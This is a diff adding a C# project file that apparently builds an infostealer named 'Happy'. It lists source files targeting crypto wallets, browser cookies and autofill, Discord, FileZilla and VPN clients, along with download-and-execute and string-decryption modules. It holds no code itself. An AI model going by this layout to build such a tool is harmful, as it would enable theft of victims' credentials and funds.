@@ -1,0 +1,135 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{27C329E7-43DB-4A6D-9753-7C1CAD3866C8}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Happy</RootNamespace>
+    <AssemblyName>Happy</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Program</StartupObject>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Account.cs" />
+    <Compile Include="AllWalletsRule.cs" />
+    <Compile Include="ArmoryRule.cs" />
+    <Compile Include="AtomicRule.cs" />
+    <Compile Include="Autofill.cs" />
+    <Compile Include="BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO.cs" />
+    <Compile Include="BCRYPT_KEY_LENGTHS_STRUCT.cs" />
+    <Compile Include="BCRYPT_OAEP_PADDING_INFO.cs" />
+    <Compile Include="BCRYPT_PSS_PADDING_INFO.cs" />
+    <Compile Include="BrowserExtensionsRule.cs" />
+    <Compile Include="BrowserVersion.cs" />
+    <Compile Include="CC.cs" />
+    <Compile Include="CoinomiRule.cs" />
+    <Compile Include="CommandLineUpdate.cs" />
+    <Compile Include="CryptoHelper.cs" />
+    <Compile Include="CryptoProvider.cs" />
+    <Compile Include="C_h_r_o_m_e.cs" />
+    <Compile Include="DataBaseConnection.cs" />
+    <Compile Include="DesktopMessangerRule.cs" />
+    <Compile Include="DiscordRule.cs" />
+    <Compile Include="DownloadAndExecuteUpdate.cs" />
+    <Compile Include="DownloadUpdate.cs" />
+    <Compile Include="ElectrumRule.cs" />
+    <Compile Include="EndpointConnection.cs" />
+    <Compile Include="EntryPoint.cs" />
+    <Compile Include="EthRule.cs" />
+    <Compile Include="ExodusRule.cs" />
+    <Compile Include="Extensions.cs" />
+    <Compile Include="FileCopier.cs" />
+    <Compile Include="FileScanner.cs" />
+    <Compile Include="FileScannerArg.cs" />
+    <Compile Include="FileScannerRule.cs" />
+    <Compile Include="FileZilla.cs" />
+    <Compile Include="GameLauncherRule.cs" />
+    <Compile Include="Gecko.cs" />
+    <Compile Include="GeoHelper.cs" />
+    <Compile Include="GeoInfo.cs" />
+    <Compile Include="GeoPlugin.cs" />
+    <Compile Include="GuardaRule.cs" />
+    <Compile Include="HardwareType.cs" />
+    <Compile Include="IpSb.cs" />
+    <Compile Include="IRemoteEndpoint.cs" />
+    <Compile Include="ITaskProcessor.cs" />
+    <Compile Include="Json.cs" />
+    <Compile Include="Jx.cs" />
+    <Compile Include="LocalState.cs" />
+    <Compile Include="MonitorHelper.cs" />
+    <Compile Include="NativeHelper.cs" />
+    <Compile Include="NordApp.cs" />
+    <Compile Include="OpenUpdate.cs" />
+    <Compile Include="OpenVPNRule.cs" />
+    <Compile Include="OsCrypt.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="ProtonVPNRule.cs" />
+    <Compile Include="RecordHeaderField.cs" />
+    <Compile Include="RecoursiveFileGrabber.cs" />
+    <Compile Include="ResultFactory.cs" />
+    <Compile Include="ScanDetails.cs" />
+    <Compile Include="ScannedBrowser.cs" />
+    <Compile Include="ScannedCookie.cs" />
+    <Compile Include="ScannedFile.cs" />
+    <Compile Include="ScanningArgs.cs" />
+    <Compile Include="ScanResult.cs" />
+    <Compile Include="SqliteMasterEntry.cs" />
+    <Compile Include="StringDecrypt.cs" />
+    <Compile Include="SystemHardware.cs" />
+    <Compile Include="SystemInfoHelper.cs" />
+    <Compile Include="TableEntry.cs" />
+    <Compile Include="TaskResolver.cs" />
+    <Compile Include="UpdateAction.cs" />
+    <Compile Include="UpdateTask.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
